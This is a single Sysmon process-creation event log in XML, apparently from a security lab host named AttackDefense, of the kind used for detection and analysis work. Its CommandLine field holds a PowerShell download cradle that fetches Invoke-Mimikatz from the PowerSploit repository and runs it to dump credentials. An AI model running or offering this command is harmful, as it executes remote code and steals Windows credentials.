<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<Events><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-03-11T12:41:02.493561600Z'/><EventRecordID>1717</EventRecordID><Correlation/><Execution ProcessID='2472' ThreadID='3180'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>AttackDefense</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2023-03-11 12:41:02.492</Data><Data Name='ProcessGuid'>{221ce7aa-76de-640c-5902-00000000dd00}</Data><Data Name='ProcessId'>3404</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='FileVersion'>10.0.17763.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "IEX (New-Object Net.WebClient).DownloadString ('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz"</Data><Data Name='CurrentDirectory'>C:\Users\Administrator\</Data><Data Name='User'>ATTACKDEFENSE\Administrator</Data><Data Name='LogonGuid'>{221ce7aa-6da3-6409-795a-050000000000}</Data><Data Name='LogonId'>0x55a79</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F</Data><Data Name='ParentProcessGuid'>{221ce7aa-76b2-640c-5602-00000000dd00}</Data><Data Name='ParentProcessId'>3332</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" </Data><Data Name='ParentUser'>ATTACKDEFENSE\Administrator</Data></EventData></Event></Events>
